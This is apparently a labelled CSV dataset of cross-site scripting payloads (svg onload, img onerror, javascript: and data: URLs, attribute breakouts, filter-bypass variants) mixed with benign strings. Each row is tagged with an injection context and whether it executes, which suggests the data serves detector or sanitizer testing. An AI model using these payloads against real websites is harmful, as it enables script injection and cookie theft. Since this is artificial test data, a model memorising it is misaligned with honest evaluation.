payload,context,exec
"data:text/html,<svg onload=alert(1)>",html_text,0
""";alert(window.origin);//",script_block,1
"<iframe srcdoc=""<img src=x onerror=alert(1)>"">",html_tag,1
safeText,html_text,0
""" onclick=alert(1)",html_attribute,1
</randomtag>,html_text,0
<script>alert(String.fromCharCode(49))</script>,html_tag,1
<img src=x onerror=alert(1)//,html_tag,1
"<iframe src=""data:text/html,<script>alert(1)</script>"">",html_tag,1
<script>top.alert(1)</script>,html_tag,1
javascript:alert(location),url_href,1
"data:text/html,<img src=x onerror=alert(1)>",url_navigation,1
AT&T,html_text,0
"data:text/html,<svg/onload=alert(1)>",html_attribute,0
""" oninput=alert(1) """,script_block,0
""" autofocus onfocus=alert(1) x=""",html_attribute,1
<source onerror=alert(1)>,html_attribute,0
guest,html_text,0
</pre><marquee onmouseover=alert(1)>hover me</marquee,html_tag,1
<IMG SRC=x ONERROR=alert(1)>,html_tag,1
<script>alert</script>,html_text,0
</pre><svg/onload=alert`1`>,url_href,0
"<iframe srcdoc=""<script>alert(1)</script>"">",url_href,0
<img src=x onerror>,html_text,0
<alert>,html_text,0
"data:text/html,<script>alert(1)</script>",url_href,0
"""><img src=x onerror=alert(1)>",html_tag,1
</textarea><svg/onload=alert(1)>,url_href,0
<script>confirm(1)</script>,html_tag,1
""" onauxclick=alert(1) """,html_attribute,1
""" onkeydown=alert(1) """,html_attribute,1
</body>,html_text,0
</pre><details open ontoggle=alert(1)>,html_tag,1
name=user,html_text,0
""";prompt(1);//",script_block,1
"data:text/html,<img src=x onerror=alert(1)>",html_attribute,0
"data:text/html,<svg onload=alert(1)>",url_navigation,1
textonly,html_text,0
<script>alert(document.domain)</script>,html_tag,1
<div>content</div>,html_text,0
<script>alert(1),html_tag,0
<svg OnLoAd=alert(1)>,html_attribute,0
<svg><script>alert(1)</script>,html_tag,1
value=test,html_text,0
confirm(1),script_block,0
"data:text/html,<script>prompt(1)</script>",html_text,0
""" onfocus=alert(1) autofocus """,html_text,0
javascript:alert(document.title),url_href,1
<a href>,html_text,0
"data:text/html,",html_text,0
<scr<script>ipt>alert(1)</scr</script>ipt>,html_attribute,0
><img src=x onerror=alert(1)>,url_href,0
admin,html_text,0
confirm(1),html_text,0
<i>text</i>,html_text,0
<video src=x onerror=alert(1)>,html_tag,1
{test},html_text,0
javascript:alert`1`,url_href,1
javascript:alert(1),url_href,1
<ScRiPt>alert(1)</ScRiPt>,html_tag,1
&#x3C;iframe&#x3E;,html_text,0
<img src=1 onerror=alert(1)>,html_tag,1
;alert(navigator.userAgent);//,url_href,0
<b>hello</b>,html_text,0
;alert(history.length);//,url_href,0
""" onmouseenter=alert(1) """,html_attribute,1
javascript:alert(document.domain),url_href,1
"data:text/html,<svg onload=alert(1)>",html_attribute,0
><svg/onload=alert(1)>,script_block,0
<svg>,html_text,0
"<iframe srcdoc=""<img src=x onerror=alert(1)>"">",url_href,0
"data:text/html,<script>alert(1)</script>",url_navigation,1
<svg/onload=alert(String.fromCharCode(49))>,html_attribute,0
"data:text/html,<img src=x onerror=alert(1)>",url_href,0
hello,html_text,0
<img src=x onerror=alert&#x28;1&#x29;>,html_tag,1
<svg/onload=alert`XSS`>,script_block,0
<img src=x onerror=,script_block,0
<source onerror=alert(1)>,html_tag,1
<meter onmouseover=alert(1)>,html_tag,1
<img src=x onerror=alert(1)>,html_attribute,0
javascript:confirm(1),html_attribute,0
""" oninput=alert(1) """,html_attribute,1
<img src=x onerror=,html_tag,0
""" onmouseenter=alert(1) """,url_href,0
plaininput,html_text,0
""" onmouseleave=alert(1) """,html_attribute,1
;alert(document.domain);//,html_attribute,0
&#60;tag&#62;,html_text,0
"""><svg/onload=alert(1)>",html_attribute,1
javascript:confirm`1`,html_attribute,0
""";alert(document.title);//",script_block,1
<meter onmouseover=alert(1)>,script_block,0
<img src=x onerror=alert('XSS')>,html_tag,1
;alert(1);//,html_text,0
<iframe src=>,html_text,0
""";alert(location);//",html_text,0
</script><script>alert(1)</script>,script_block,1
<svg/onload=alert(1)>,url_href,0
hello,html_tag,0
onmouseover=alert(1),html_attribute,1
</title><svg/onload=alert(1)>,html_text,0
><svg/onload=alert(1)>,html_text,0
""" onkeyup=alert(1) """,html_attribute,1
</pre><svg/onload=alert`1`>,html_tag,1
<svg><script>alert(document.domain)</script>,html_tag,1
<img src=x onerror=alert(1)>,html_tag,1
""";alert(document.cookie);//",script_block,1
</textarea><svg/onload=alert(1)>,html_text,0
<svg/onload=alert(String.fromCharCode(49))>,html_tag,1
<svg/onload=alert(1)>,html_tag,1
"data:text/html,<script>alert(document.cookie)</script>",html_text,0
<script>prompt(1)</script>,html_tag,1
javascript:prompt(1),url_navigation,1
</pre><details open ontoggle=alert(1)>,script_block,0
<svg>,html_attribute,0
""";alert(navigator.userAgent);//",script_block,1
value=test,html_attribute,0
</script><svg/onload=alert(1)>,html_text,0
</pre><img src=x onerror=alert`1`>,html_tag,1
<scr<script>ipt>alert(1)</scr</script>ipt>,html_text,0
(1+1),html_text,0
</pre><body onload=alert(1)>,html_tag,1
"""><svg/onload=alert(1)>",html_tag,1
title=hello,html_text,0
""";alert(document.cookie);//",html_tag,0
<svg><script>prompt(1)</script>,html_tag,1
<svg onload>,html_text,0
javascript:confirm(1),url_navigation,1
<img src=x onerror=alert(location)>,html_tag,1
"<iframe srcdoc=""<img src=x onerror=alert(1)>"">",html_attribute,0
<svg/onload=confirm`1`>,script_block,0
onload=alert(1),html_text,0
"<iframe srcdoc=""<svg onload=alert(1)>"">",html_tag,1
javascript:confirm`1`,url_href,1
<svg onload=alert(location)>,html_tag,1
<img src=a onerror=alert(document.cookie)>,html_tag,1
<svg OnLoAd=alert(1)>,html_tag,1
"data:text/html,<svg/onload=alert(1)>",url_navigation,1
""" onwheel=alert(1) """,html_attribute,1
""" onfocus=alert(1) autofocus """,url_href,0
<body onload=alert(1)>,html_tag,1
</script><svg/onload=alert(1)>,script_block,1
onblur=alert(1),html_text,0
"<iframe srcdoc=""<script>alert(1)</script>"">",html_tag,1
<img src=x onerror=alert(navigator.userAgent)>,html_tag,1
javascript:prompt(1),html_tag,0
"""><img src=x onerror=alert(1)>",html_attribute,1
javascript:alert(window.origin),url_href,1
